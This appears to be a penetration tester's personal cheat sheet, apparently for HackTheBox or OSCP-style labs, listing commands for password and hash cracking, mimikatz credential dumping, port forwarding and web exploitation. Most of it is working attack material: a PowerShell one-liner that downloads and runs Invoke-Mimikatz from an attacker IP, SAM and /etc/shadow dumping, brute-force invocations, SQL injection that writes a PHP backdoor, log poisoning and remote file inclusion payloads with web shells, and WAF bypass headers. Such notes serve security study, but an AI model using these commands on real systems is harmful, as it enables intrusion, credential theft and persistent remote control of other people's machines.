- Pinging
    > on victim > bash -c ping -c 1 10.10.14.28
    > on kali > sudo tcpdump -i tun0 -n icmp

# Services running on ports (on Kali):
-------------------------------------
## Look up what service is using a port 
    - Linux 
        - netstat
            > sudo netstat -ltnp | grep 80
        - lsfo
            > lsof -i :80
        - fuser & find port using pid
            > fuser 80/tcp
            > ps -p 2053 -o comm=
        - ss
            > sudo ss -lptn 'sport = :80'
    - Windows
        - powershell
            > powershell -c "Get-Process -Id (Get-NetTCPConnection -LocalPort 14147).OwningProcess"
        - requires admin priv
            > netstat -a -b
        - no adminpriv
            > netstat -ano | findstr <port>
            > tasklist | findstr "<port>"


## Servers:
    - ftp server:
        > start > sudo python -m pyftpdlib -p 21 -w
        > stop > Ctrl+C
    - tftp:
        > start > sudo atftpd --daemon --port 69 ./tftp
        > stop > pgrep tftp AND kill PID
    - http(python):
        > start > ptyhon3 -m http.server 8088
        > start > python -m SimpleHTTPServer 8088
        > stop > Ctrl+C
        OR
        > HTTP 8088 192.168.1.156
        - CTRL r
        - search for file name
    - http(apache)-:
        - move files into /var/www/html/
        > start > systemctl start apache2.service
    - samba server:
        - Create share on Kali, pull from Windows
            - On kali
            > mkdir ./smb
            > start > sudo smbserver.py share smb/
            > start (smb2) > sudo smbserver.py share smb/ -smb2support
            - On Windows (Copy a file)
            > copy \\10.10.14.18\share\file-to-download.exe file-to-download.exe
                        > svwar -D -m INVITE 10.10.10.7
            - On Windows (connect to whole share)
            > net use X: \\10.10.14.25\Share 

        - Create share on Windows, pull from Kali
            - On windows
                > net share MyShareName="C:\My Local Path\SomeFolder" /GRANT:Everyone,FULL
            - On Kali
                > smbclient -U '' //10.10.10.97/MyShareName
                > get filetodownload.txt

# Password cracking: 
--------------------
### Word lists
- Already created lists:
    - rockyou: /usr/share/wordlists
    - usernames: /usr/share/seclists/Usernames/Names/names.txt
- CeWL: create a word list based off a website
    - "-m 5" is min length of words, "-d 2" is how deep down site links 
        > cewl -m 5 -w newwebwordlist.txt -d 2 -v https://10.10.10.7/
- John The Ripper:
    - Run john the ripper to adjust/mutate a list 
        - Config file --> /etc/john/john.conf
        > john --wordlist=newwebwordlist.txt --rules --stdout > mutated.txt
    - SSH
        - Go to this site, decode private key as pem format
            - https://8gwifi.org/PemParserFunctions.jsp
        - convert to john format
            > ssh2ngjohn.py key.pem > key.hash
        - crack wiht john
            > john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
- Crunch: juxtapate word list
    - Create word list with min 4 chars max 8 
        > crunch 4 8
    - Create word list with min 4 chars max 8 charset 1234567890 output to file
        > crunch 4 8 1234567890 -o ./wordlist.txt
    - show values for charset lists
        > cat /usr/share/crunch/charset.lst
    - Create a word list with a charset list
        > crunch 3 5 -f /usr/share/crunch/charset.lst mixalpha-numeric
- wordlister
    - Create a list of words
    - Create combinations of words
        > wordlister --input p.txt --perm 2 --min 4 --max 32 --middle ':'



### Download copy of site to search 
    - httack
        > sudo httrack http://10.10.10.75/nibbleblog/content/ -O /home/dave/hackthebox/SystemsHacked/legacy-lin-nibbles-10.10.10.75/fullsite/

### Extracting jar files
    - Download Jar file and unpackage it
        > jar xf BLockyCore.jar
    - Search what was inside, and unpackage .class files with jad
        > jad BlockyCore.class
    - This will create a ".jad" file form the class, you can cat the file
    - You may find plain text passwords
        

# Hash cracking
---------------
### Identify Hash files
    - hashid
        > hashid <hash>
    - hash-identifier
        > hash-identifier <hash>

### Extract hash with mimikatz
    - Must run cmd as nt admin/system or administrator user.
        >  mimikatz.exe
        >  privilege::debug
        >  token::elevate
        >  log
        >  coffee
        >  lsadump::sam
        >  exit
    - Run mimikatz.ps1 instead via downloads
        - Run a python http listener and share mimikatz-hashes.txt
        - Make sure "Invoke-Mimikatz.ps1" is in the shared dir
        - Adjust "Invoke-Mimikatz.ps1"
            - check line 2710 to adjust commands to be run 
            ## Extraxt current password hashes 
            # $ExeArgs = "privilege::debug sekurlsa::logonpasswords exit"
            ## Extraxt tickets 
            # $ExeArgs = "privilege::debug sekurlsa::tickets exit"
            ## Extraxt kerberos tickets 
            $ExeArgs = "`"kerberos::list /export`" exit"
        - Run the following command in the windows system
            > powershell.exe -exec bypass -C “iex (New-Object System.Net.Webclient).DownloadString('http://192.168.1.156:8080/binaries/Windows/mimikatz/Invoke-Mimikatz.ps1');Invoke-Mimikatz" > mimikatz-hashes.txt
            powershell.exe -exec bypass -C “iex (New-Object System.Net.Webclient).DownloadString('http://10.10.14.18/Invoke-Mimikatz.ps1');Invoke-Mimikatz" > mimikatz-hashes.txt
        - Extract hashes from output
            > type mimikatz-hashes.txt | find /c /v ""
    - Dump Local Security Authority Process (LSAP)
        - Requires admin and from gui
        - open task manager and right click the processes and create dump file
        - upload mimikatz
            > sekurlsa::minidump c:\Tools\mimikatz\lsass.dmp
            > sekurlsa::logonpasswords
            > type mimikatz-hashes.txt | findstr /S /I /C:"* Username" /C:"* NTLM" /C:"* SHA1"

### Extracting Hashs from Windows
    - Gathering SAM has files
        - dump hash files
            > reg save hklm\sam c:\sam
        - dump system hive
            > reg save hklm\system c:\system
        - Extract hashs 
            > python ~/notes/exam/binaries/Windows/creddump7/python2/pwdump.py ./system ./sam > pwlist.txt
        - Use John to rip
            - windows
                > john ./pwlist.txt --format=nt --wordlist=/usr/share/wordlists/rockyou.txt
            - linux
                > john ./pwlist.txt --wordlist=/usr/share/wordlists/rockyou.txt
    - Gather SAM from backups
        - check backup locations
            - C:\Windows\Repair
            - C:\Windows\System32\config\RegBack
        - To break hashs see "Extracting Hashs from Windows" section
        - Use psexec of pth-winexe to pass the hash


### Cracking hash
    - hashcat
        - Determine exact type of hash (use hashid and/or hash-identifier)
        > hashcat -h | grep -i <hashid type>
        - make note of the id (will be used for the -m parameter)
        > hashcat -m 100 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt
    - Crack from web (For MD5 and SHA1)
        > https://hashtoolkit.com
    - Hashcat hash text examples
        > https://hashcat.net/wiki/doku.php?id=example_hashes
    - Hashcat examples:
        - Blowfish + use wordlist
            > hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force


    - Windows
        - Gather hashes
        - Windows: word list brute force
            > john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
        - Windows: use rules to mangle
            > john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
    - Linux
        METHOD01:
            - Extract hash for user, only copy between First ":" and second, copy to a file
            - /etc/shadow hash values
                - $1$ is MD5
                - $2a$ is Blowfish
                - $2y$ is Blowfish
                - $5$ is SHA-256
                - $6$ is SHA-512
            - crack with john apply specific format for above hash
                > john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
        METHOD02:
            - Gather hashes 
                > cat /etc/passwd > passwd.txt
                > cat /etc/shadow > shadow.txt
                - scp them back to kali
                > unshadow passwd.txt shadow.txt > unshadow.txt
            - pass unshadowed file to john
                > john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt


### Brute force
    - crackmapexec
        - crackmapexec smb 10.10.10.184 -u users -p passwds
    - Website login:
        - hydra
            - Go to site with firefox (login page)
            - open inspect mode with firefox > Network
            - try any login - look for "POST" line, and select it, then select "edit and resend button"
            - make note of "Request Body" section that will be what ou enter for the http(s)-post-form section
            - for sites that have no username, provide one anyway. Just dont use the ^USER^ in your post-form section
                - Post form section --> SITE:REQUEST-BODY:ERROR (ERROR is the error message that appears when entering in the wrong password, this does not need to be the full message)
            - Run the following
                - HTTP
                    > hydra -l admin -P /usr/share/wordlists/rockyou.txt testasp.vulnweb.com http-post-form "/Login.asp:tfUName=^USER^&tfUPass=^PASS^:S=logout" -vV -f
                    Or (use a specific username
                    > hydra -l tyler -P /usr/share/wordlists/rockyou.txt 10.10.10.97 http-post-form "/login.php:username=tyler&password=^PASS^:not valid" -vV -f
                    Or
                    > hydra -L ./users.txt -P /usr/share/wordlists/rockyou.txt 10.10.10.58 http-post-form "{"username":"^USER^","password":"^PASS^"}:Login Failed" -vV -f
                - HTTPS
                    > hydra -l fuck -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/pdb/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" -vV -f
            - wait for crack
        - patator
            - Use for regular http form 
                - Make note of the ACTUAL path in the HTTP header
                - Run it with this command
                    > patator http_fuzz url='http://192.168.1.106:3000/rest/user/login' method=POST body='email=mc.safesearch@juice-sh.op&password=FILE0' 0=passwd.txt -x ignore:fgrep='Invalid email or password'
                    Ignore 200's
                    > patator http_fuzz url='http://192.168.131.145/openemr/interface/main/main_screen.php?auth=login&site=default' method=POST body='new_login_session_management=1&authProvider=Default&authUser=admin&clearPass=FILE0&languageChoice=1' 0=/usr/share/wordlists/rockyou.txt follow=1 accept_cookie=1 -x=ignore:code=200
            - pypmyadmin login
                > patator http_fuzz url=http://10.0.0.1/pma/index.php method=POST body='pma_username=COMBO00&pma_password=COMBO01&server=1&target=index.php&lang=en&token=' 0=combos.txt before_urls=http://10.0.0.1/pma/index.php accept_cookie=1 follow=1 -x ignore:fgrep='Cannot log in to the MySQL server' -l /tmp/qsdf
            - Use for multi-part form
                - Make note of the ACTUAL path in the HTTP header
                - Grab the login form with burpsuite
                - Take the multipart and make a file with it "formbody.txt"
                - Run it with this command
                    > patator http_fuzz url=http://192.168.209.44/public_html/index.php?name=Your_Account method=POST header=@<(echo -e 'Content-Type: multipart/form-data; boundary=1463588804106264703730528152\nUser-Agent: RTFM') body=@formbody.txt auto_urlencode=0 0=/usr/share/wordlists/rockyou.txt
    - SSH:
        - single user:
            > hydra -l sunny -P '/usr/share/wordlists/rockyou.txt' 10.10.10.76 ssh -s 22022
            > patator ssh_login host=10.10.10.76 port=22022 password=FILE0 0=/usr/share/seclists/Passwords/probable-v2-top1575.txt user=sunny -x ignore:mesg='Authentication failed.'
        - userlist
            > hydra -L './userlist.txt' -P './ciscopass7found.txt' 192.168.165.141 ssh -s 22
    - Orcale:
        > hydra -P rockyou.txt -t 32 -s 1521 10.10.10.82 oracle-listener
        > hydra -L /usr/share/oscanner/lib/services.txt -s 1521 host.victim oracle-sid
    - POP3:
        > hydra -l webadmin -P '/usr/share/wordlists/rockyou.txt' 10.10.10.76 pop3 -s 110

### cracking zip
    - crack zip file:
        > fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' bank-account.zip

### cracking vnc
    - crack vnc password
        > vncpwd <vnc password file>

### cracking pdf
    - First get a hash for the pdf
        > /usr/share/john/pdf2john.pl Infrastructure.pdf > Infrastructure.pdf.hash
    - Run john against it
        > john --wordlists=/usr/share/wordlists/rockyou.txt Infrastructure.pdf.hash
    - Open and put password in
        > evince Infrastructure.pdf

### Cracking cisco type 7 passwords
    - Load single hash
        > ciscot7.py -p 08014249001C254641585B
    - Load whole config
        > ciscot7.py -f cisco-config



# Forensics
-----------
    - Check for deleted file strings
        - find disk location in dev with mount first
            > mount
        - Run this command to search for contents of file
            > grep -a -C 500 'root.txt' /dev/sdb
    - Check actual file type
        - file <filename>
        - Check language encoding
            > enca <filename>
            > enca -L polish -x UTF-8 <filename>
    - stegcrack:
        > stegcrack nineveh.jpg /usr/share/wordlists/rockyou.txt
    - steghide:
        > steghide extract -sf nineveh.jpg
        > steghide embed -cf nineveh.jpg -ef secret.txt
    - stegsolve:
        > stegsolve.jar
            - variety of ways to extracting info from a picture
    - strings (Auto pull any strings found from hex encoded info)
        > strings file.png
    - vim hex editor (check for strings manually from hex encoded data)
        > vim
            > :%!xxd
        > bless file.jpg
    - Check entropy (Density of bits per file), good to check if something maybe encrypted
        > ent file.possiblyencrpyted
            - 0 = no randomness
            - 3.5 - 5 = english language
            - 8 = prpoerly encrpyted or compressed data 

    - Adjust encoding
        - By language
            - put into vim with hex editor
            - put raw hex into here https://www.convertstring.com/EncodeDecode/HexDecode
            - Make sure spacing is set to "ASCII SPACE"
            - Whatever appears throw into google translate
    - exprestion language compilers
        - Decoding site (Must know what you are looking for first)
            - https://www.dcode.fr/
        - brainfuck and Ook!
            - https://www.geocachingtoolbox.com/index.php?lang=en&page=brainfuckOok
        - Many languages
            - https://tio.run/#
        - brainfuck
            - https://copy.sh/brainfuck/
    - decoding
        * ALWAYS look for encoding type
        - decode base64 string
            - decode base64
                > cat myplace.backup | base64 --decode > myplace
            - deocde base64 and conver to hex
                > echo longencodedstring | base64 -d | xxd
                - you may need to remove '\r\n'
                    cat index.php | xxd -r -p | tr -d '\r\n' | base64 -d
        - Magic byte type
            - Put file into hex editor and look for encoding string on first line, search for "list of signatures" on wiki
        - Determine encoding
            > cat index.php | xxd -r -p
    - binwalk (check what files are embeded)
        - list contents
            > binwalk nineveh.png
        - Extract contents
            > binwalk -e nineveh.png
    - Determine type of file
        > file myplace
    - recursivly decode base64 string
        > AllYour64 -d $(cat passwd.txt)
    - decode hex dump
        > cat hex_dump_file | xxd -r -p
    - unencrypt encrypted Key
        > openssl rsa -in hype_key_encrypted -out hype_key_decrypted
    - Check image file metadata
        > exiftool dog.jpg
    - Cut up a gif file
        > convert a.gif target.png


# Port Forwarding
----------------- -
## SSH port forwarding (tunnel)
    - Perform ssh port forward: "1443" is the local port to listen on, "10.1.8.20:443" is the ip to go to.
        > sudo ssh user@10.10.10.39 -L 1443:10.1.8.20:443
    - Open service, for the example open a browser to https://127.0.0.1:1443

    - OPTION1: Run FROM Victim (Reverse)
        > ssh -R 4444:127.0.0.1:3306 dave@192.168.1.156 -p 222
        - now connect via port 4444
        > mysql -h 127.0.0.1 -P 4444 -u root -p
    - OPTION2: Run FROM Kali (Direct connect [like putty])
        > sshpass -p 'L1k3B1gBut7s@W0rk' ssh nadine@10.10.10.184 -L 3306:127.0.0.1:3306


## Plink
    - Download plink.exe onto the windows box
    - The following command will connect to SSH server via a differnet port, you must configure /etc/ssh/sshd_config to use port 222, change back when done. This will forward port 8888 on the windows host machine to your kali
        > plink_x64.exe -ssh dave@10.10.14.18 -P 222 -R 8888:127.0.0.1:8888
    - You may need to enabled PermmitRootLogin in sshd_config and/or ssh_config, then restart the ssh service
    - after you login to your machine anything you run on port 8888 will be run on the windows box on that port

## netsh (both require elevation)
    - option1
        > netsh interface portproxy add v4tov4 listenport=8989 listenaddress=172.16.135.5 connectport=8888 connectaddress=192.168.119.135
        > netstat -anp TCP | findstr “8989”
        > netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=192.168.135.10 localport=8989 action=allow
    - option2
        > netsh interface portproxy add v4tov4 listenaddress=192.168.187.44 listenport=445 connectaddress=0.0.0.0 connectport=4444
            - listenaddress – is a local IP address to listen for incoming connection (useful if you have multiple NICs or multiple IP addresses on one interface);
            - listenport – local listening TCP port number (the connection is waiting on);
            - connectaddress – is a local or remote IP address (or DNS name) to which you want to redirect incoming connection;
            - connectport – is a TCP port to which the connection from listenport is forwarded to.

## Socat
    - https://book.hacktricks.xyz/tunneling-and-port-forwarding 
    - https://ironhackers.es/en/cheatsheet/port-forwarding-cheatsheet/

## Metepreter
    - Port forward with metapreter
        > portfwd add -l 9090 -p 9090 -r 10.11.1.73


# Web exploits
--------------

##LFI directories to look for
    - /etc/passwd
    - /etc/shadow
    - /home/user/.ssh/id_rsa
    - /home/user/.ssh/id_ed25519
    - /home/user/.bash_history
    - /proc/self/environ
    - /etc/hosts

## File shares
    - /etc/exports
    - /etc/samba/smb.conf

## Default web directories 
    - config.php (adjust after html as needed)
        - /var/www/html/config.php
    - Apache2
        - /var/www/html/
        - /var/log/apache2/access.log
        - /var/log/apache2/error.log
        - /etc/apache2/sites-enabled/000-default.conf
    - Apache tomcat
        - /usr/local/tomcat<version>/webapps/ROOT/
        - /usr/local/tomcat9/conf/server.xml
        - /usr/local/tomcat<version>/conf/tomcat-users.xml 
            - can find the tomcat manager login here
    - nginx
        - /var/www/html/
        - /var/log/nginx/error.log
        - /var/log/nginx/access.log
        - /etc/nginx/sites-enabled/default
        - /usr/share/nginx/html/
    - Windows IIS
        - C:\inetpub\wwwroot\myapp
        - C:\inetpub\logs\LogFIles

## Web shell locations
    - /usr/share/laudanum
    - /usr/share/webshells

## Find odd HTTP headers
    - Look through site for odd urls being used 
    - Use burp suite to capture header to view
    - Check the source code with Debugger in te browser and search through any js for "path"

## Bypass file checks for upload
    - Rename the file
        - php phtml, .php, .php3, .php4, .php5, and .inc
        - asp asp, .aspx
        - perl .pl, .pm, .cgi, .lib
        - jsp .jsp, .jspx, .jsw, .jsv, and .jspf
        - Coldfusion .cfm, .cfml, .cfc, .dbm
    - PHP bypass trickery (Must be PHP < 5.3)
        - Add a question mark at the end 
            - dog.jpg?
        - NULL BYTE
            - dog.jpg%00
    - Use a magic mime type:
        - https://en.wikipedia.org/wiki/List_of_file_signatures#
        - Example use "GIF89a;" in a php file
    - exiftool (inject RCE into metadata comment section)
        > exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg
        > mv lo.jpg lo.php.jpg

## XSS commands
    - XSS can be tiggered in any textbox field, try putting the below in a variety of fields
    - Check if xss is workable via scripts:
        > <script type="text/JavaScript">console.log("MoreGoodies!");</script>
        > <script>alert('XSS')</script>

## XXE exposer (XML External Entity exposer)
    - Good sites with examples:
        - https://github.com/payloadbox/xxe-injection-payload-list
        - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing

    - put any example into a .xml file, and up load to the system, find some way for the system to execute the file. Must be able to upload xml type file
    - User burp to capture the post and send to repeater to get content. See "XXE Data Access" challenege in Juice Shop
    - This will in the end give you contents of files. 


## Directory traversal
        - look in url for “file=<file>” in the url
        - Change “file” to a new file
            - Should uncover directory structure and possible OS
        - c:\windows\system32\drivers\etc\hosts


### PHP
    - send a "$ne" to the server
    - In burp get a request and change the form to 
        > username[$ne]=eviluser&password[$ne]=evilpass&login=login
    - Check for users with "1 character"
        > username[$regex]=^.{1}$&password[$ne]=evilpass&login=login
            - increment the "1" until you see a 302, which indicates how long a password is for a user

### phpmyadmin
    - passwords can be found here "\xampp\phpMyAdmin\config.inc.php"

### NodeJS
    - change the Content-Type to "Content-Type: application/json"
    - Adjust payload to json format
        {
            "username: { "$ne": evileuser" },
            "password: { "$ne": evilpass" },
            "login: "login"
        }


## sql injection

    ### Functions per db:
    - MariaDB / Mysql
        System variables:
            - @@hostname - Current hostname
            - @@tmpdir - temp dir
            - @@datadir - data dir
            - @@version - version of db
            - @@basedir - base dir
            - user() - Current user
            - database() - Current database
            - version() - current database version
            - schema() - current database
            - UUID() - System UUID key
            - current_user() - Current user
            - current_user - Current user
            - system_user() - Current system user
            - session_user() - current session user
            
        Schema: 
            - information_schema.tables
            > select name from information_schema.tables

    - sqlite
        System variables:
            - sqlite_version() - current version
            - 
        Schema:
            - sqlite_master
            > select name from sqlite_master where type='table' and name not like 'sqlite_%'

    ### Boolean based SQLi:
    - Try the username / password for each entry in the link.
    - Try just the username and any password you want. Do in a "change password" page.

    ### ERror based SQLi:
    - If the web interface shares the actual errors from the database, you can query to figure out specifics about the db
        - Example: Append another statement, this should have the database return an error if that table does not exist
                    Or it could also show how many columns are in the table you are testing with if you put this sqli in another text box
            > Test'); select * from tablename; --


    ### Inband SQLi:
    - Step 1:
        - Find a text box that is injectable:
            - use ' or " in all text boxes, monitor web output, as well as "NETWORK" on insepct elements to see if any 500 errors appear
        - Text box found:
            - Now determine how the data is sent from the box, use "NETWORK" or burp again to see how data is sent
                - GET, POST, UPDATE, PUT
                - Check if cookies are given to you under "STORAGE"
            - Look at source from inspect element find the field names, they most likely will be the same for the SQL attributes in the table
            - Figure out how the statement maybe created, and what the table looks like
                - Is this text box filtering data in some way?
                - Is this text box used to create data?
                - Is this text box used to manipulate data / remove data?
                    1) from
                    2) where
                    3) group by
                    4) having
                    5) select
                    6) order by
                    7) limit
            - Use the following to try and create a table to determine what it looks like 
                - Start sqlite db on kali at any time
                    > sqlite3
                    - Create tables to pratice sql commands during a challenge if needed
                    - Show schema
                        > .schema sqlite_master
                    - Get atbles
                        > .tables
                    - Build users table and insert values
                        > CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', `deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', `totpSecret` VARCHAR(255) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME);
                        > INSERT INTO Users(id,username,email,password,createdAt,updatedAt) VALUES ('1','Chris','chris.pike@juice-sh.op','asdfasdf','test','test2');
                - View this page for types of inpu6:
                    - https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
            - What to consider when creating the sqli
                - Does the database respond to ' or " ?
                - How to start the statement? ( or ) ?
                - How to end the statement? ) or  ); ?
                - Comment out the rest -- -    or    #   or    /*


    ## Steps to figure out SQLi path
    - First try ' and "  on an input table
        - Monitor if there are any errors on the page
        - If not also check "inspect element" > network tab and see if errors appear, if you see 500 error, SQLi exists
    - There maybe some type of sql protection, can you bypass with burpsuite or from the URL?
        - Example: "http://10.10.125.185:5000/sesqli3/login?profileID=-1' or 1=1-- -&password=a"
        - Example in url encoded: "http://10.10.125.185:5000/sesqli3/login?profileID=-1%27%20or%201=1--%20-&password=a"
    ### Login screen
    - Try a simple SQLi
        > 'OR 1=1-- -
        > 'OR true-- -
    - Try URL encoding as well
        > 'OR%201=1--%20-
        > 'OR%20true--%20-
    ### Input box non-string (Integer required)
        - Example: profileID=10
        > 1 or 1=1-- -
    ### Input box string 
        - Example: profileID='10'
        > 1' or '1'='1'-- -
    ### URL injection (Look at URL for php entry, look for GET statements in BURP)
        - Example: check URL if there is php to allow injection
        > 1'+or+'1'$3d'1'--+-+
    ### POST injection (Look for POST statements in BURP)
        - Example: look for POST statements in BURP
        > -1' or 1=1--
    ### UPDATE injection
        - Look at source code in inspect element, find the fields names, could be used in SQL fields (nickName, email, password, etc.)
        > asd',nickName='test',email='a
        - Get DB to identify what it is
            - MySQL and MSSQL
            > ',nickName=@@version,email='
            - Oracle
            > ',nickName=(SELECT banner FROM v$version),email='
            - SQLite
            > ',nickName=sqlite_version(),email='
        - group_concat()



    - SQL injection from text boxes
        - always try passing a single ' or " to the text box first. 
            - When doing so if you see odd output, check the "Network" view of the inspect element console. 
                - Look for any errors from the server, select them, and go to "respone" tab
                - Can run ' Or true -- 
                    - "--" stops the rest of a command from being executed by commenting it out


    - SQL injection from webRUL
        - fuzz the database
            > http://admin.supersecurehotel.htb/room.php?cod=100%20UNION%20SELECT%201,2,3,4,5,6,7;--%20-


    - Pass a single ' or " into input boxes to check to see if data is passed directly to the database.
    - Test ID paramter with single quote
    http://192.168.135.10/debug.php?id='
    - Determine how many columns are in a site, increment until it fails.
    http://192.168.135.10/debug.php?id=1 order by 1 
    - We can use a Union to extract more information about the data, gives context of the indexes for peach column
    http://192.168.135.10/debug.php?id=2 union all select 1,2,3
    - Extract data from the database, such as version for MariaDB
    http://192.168.135.10/debug.php?id=2 union all select 1,2,@@version
    - Show current DB user
    http://192.168.135.10/debug.php?id=2 union all select 1,2,user()
    - Gather all of the schema
    http://192.168.135.10/debug.php?id=2 union all select 1,2,table_name from information_schema.tables
    - Extraxt column headers for a table
    http://192.168.135.10/debug.php?id=2 union all select 1,2,column_name from information_schema.columns where table_name=%27users%27
    - Extraction of usernames and passwords
    http://192.168.135.10/debug.php?id=2%20union%20all%20select%201,%20username,%20password%20from%20users
    - Read files
    http://192.168.135.10/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
    - Create a file and inject code for a backdoor
    http://192.168.135.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php' 
    - Access backdoor
    http://192.168.135.10/backdoor.php?cmd=ipconfig

## nosql injection

## sqlmap
    - First perform a post request with burp suite(Which page to use is all depended on what exploit you find)
        - send to repeater, test post again to make sure it works
        - right click the request area, "copy to file", save as a .txt
        - Turn off proxy and intercept in burp!
    > sqlmap -r request2.txt --dbms mysql --os-shell


## PHP type juggling
    - Change post request in burp from
        username=admin&password=
    - To this
        username=admin&password[]=

## LFI vulns
    1) <?php $file = $_GET["file"]; include $file; ?>
    2) The above command is an example of getting information about a file
    
    - Null byte, bypass to view files
        > vuln.php?page=/etc/passwd%00
        > vuln.php?page=/etc/passwd%2500

## Log poisoning
    - First look for the phpinfo.php file, this can tell you where directory paths are
        - default path depends on server (look for php5.ini, or php.ini etc.)
    - Determine the distro, this will help to determine where apache and other 
      readable files are located
    - Need to find some type of input that allows for (found in ini.php)
        - allow_url_fopen (This is for LFI, and Log file poision)
        - allow_url_include (This with allow_rul_fopen enabled, will all for RFI)
    - The true test is to be able to read the URL, if you see something like this, you maybe able to fuzz for files
        - http://10.10.10.84/browse.php?file=
    - Enter a file path 
        - http://10.10.10.84/browse.php?file=/etc/passwd
        - Maybe try something with many backslashes
            - http://10.10.10.84/browse.php?file=../../../../../etc/passwd
    - Now start trying to find the web server type, and OS and determine where the apahce config file location is
        - This will show where log files are located, try to find the access.log or error.log
    - Send to burpsuite proxy, and to burpsuite repeater 
        - At this point you will need to adjust the user agent to inject a php web shell
            GET / HTTP/1.1
            Host: 10.10.10.84
            User-Agent: evil: <?php system($_GET['c']); ?>

            also try 

            GET / HTTP/1.1
            Host: 10.10.10.84
            User-Agent: <?php system($_GET['c']); ?>

        - Send the request (you will recieve a bad request which is good)
        - Now send a GET request to the specific log file with a command
            GET /browse.php?file=/var/log/httpd-access.log&c=pwd HTTP/1.1
            Host: 10.10.10.84
            User-Agent: evil: <?php system($_GET['c']); ?>

            also try

            GET /browse.php?file=/var/log/httpd-access.log&c=pwd HTTP/1.1
            Host: 10.10.10.84
            User-Agent: evil: <?php system($_GET['c']); ?>
            
        - If you check the output you should see "evil" and the command you sent. Now you have code execution
        - Use a php reverse shell for the command now to get control.
- 


## LFI Code execution:
    1) You can now execute reading a file and running the file as code, any command can now be run.
    2) "http://192.168.135.10/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig"

## RFI Code xecution:
    1) Server must be configured in a specific way (allow_url_include set to “On”) [on by default on older versions]
    2) Create the filw in /var/www/html/evil.txt
        <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; ?>

    3) Change the 'cmd' to whatever you want
    4) sudo systemctl restart apache2
    5) http://192.168.135.10/menu.php?file=http://192.168.119.135/evil.txt&cmd=ipconfig
    6) You can find more web shells in /usr/share/webshells

    - Mount a webshell with null byte
    192.168.135.10/menu2.php?file=http://192.168.119.135/qsd-php-backdoor.php?

## Poison Null Bypte (Input validation)
    - Use this on a site that does not let you open files that are only a specific format.
    - The following will get past a site that only allows ".md" files.
    - Null Byte = %2500
        > http://192.168.1.106:3000/ftp/eastere.gg%2500.md

## Bypass WAF
    - You can possibly pass the "localhost" id to the server with "X-Forwarded-For: localhost" header
        > curl -i http://192.168.131.134:13337/logs?file=/etc/passwd -H "X-Forwarded-For: localhost";echo
        - If system is trying to snatize try the following 
        > curl -i http://192.168.131.134:13337/logs?file=/etc/passwd -H "X-Forwarded-For: localhost' or 1=1--";echo
    - Try other variations of x-forwarded-for
        - X-Host
        - X-Forwarded-Server
        - X-HTTP-Host-Override
        - Forwarded

# MISC Info:
------------
- Search a git repo for words in repo
    - You need to ad "/search?q=" at the end of the url
    - example:
        > https://github.com/openemr/openemr
            - Add "/search?q=" to the end with the word you want to search for 
        > https://github.com/openemr/openemr/search?q=version
            - Will search for the word "version" in the repo

# MISC linux commands:
----------------------
- Update databases
    - searchsploit
        > searchsploit -u
    - locate
        > sudo updatedb
        - search for all directories
            > locate -r '/[^\.]*$'
        - add a  directory
            > locate -r '/dirname$'
    - nmap nse scripts
        > sudo nmap --script-updatedb
- Run background jobs
    > some_cmd > some_file_output 2>&1 &
    - status
        > jobs
    - kill job 1
        > jobs %1
    - bring job 2 to foreground
        > fg 2
- interactive shell
    - Allow clear, and colors
        > export TERM=xterm-color
    - Start with rlwrap (Note: you cannot tab complete with stty)
        > rlwrap nc -nlvp 4444
    - Get access to bash
        > python -c 'import pty; pty.spawn("/bin/bash")'
        > python3 -c 'import pty; pty.spawn("/bin/bash")'
    - Allow tab complete, and fully interactive (MUST NOT USE "rlwrap")
        # METHOD 1
            - in victim
                > python -c 'import pty; pty.spawn("/bin/bash")'
                > CTRL-z
            - Now you are in kali
                > stty raw -echo
                > fg
            - back in victim
                > reset
                > vt100
                > export TERM=xterm-color
        # METHOD 2 (Not great with tmux)
            - In current NC session
                > CTRL+z
            - Now you are back in your local shell
                > stty raw -echo
                > fg
                > ENTER
            - Now you are back in the NC session
            - In another tmux window look up stty sessions
                > stty -a
                - Make note of "rows" value and "columns" value
            - Go back to the NC session
                > stty rows 9 columns 1
    - Change default shell
        > chsh --shell /bin/bash
        > SHELL=/bin/bash
        > setenv SHELL /bin/bash
- tree like commands
    - list all files recursivly
        > ls -lR
    - List all files recursivly 
        > find . -type f -not -path '*/\.*'
    - list but directories first
        > ls -l --group-directories-first
- xclip
    - copy all contents of a file to xclip
        > xclip -i job.b64 -selection clipboard
- Convert epoch time
    - date -d @1606778395

- clean up exploit that has "^M" characters in it
    > sed -i -e "s/^M//" filename.sh
    OR
    > vi filename.sh
    > :e +ff=unix
    - manually delete

- Decompress compression
    - tar.gz
        - compress
            > tar -zcvf newfiletocreate.tar.gz directory/
        - uncompress
            > tar -zxvf newfiletocreate.tar.gz
